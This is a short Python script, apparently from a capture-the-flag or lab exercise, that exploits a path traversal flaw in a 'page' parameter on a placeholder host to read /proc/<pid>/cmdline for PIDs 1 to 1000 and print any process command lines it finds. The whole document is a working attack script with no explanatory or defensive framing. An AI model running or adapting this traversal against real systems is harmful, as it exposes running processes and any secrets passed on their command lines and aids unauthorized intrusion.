import requests

for i in range(1, 1001):
    print(f"\r{i}", end="", flush=True)
    url = f"http://website/?page=../../../../../proc/{i}/cmdline"
    response = requests.get(url)
    
    if response.status_code == 200:
        content = response.text
        if 'Page not found' not in content and content:
            print(f"\r/proc/{i}/cmdline: {content}")
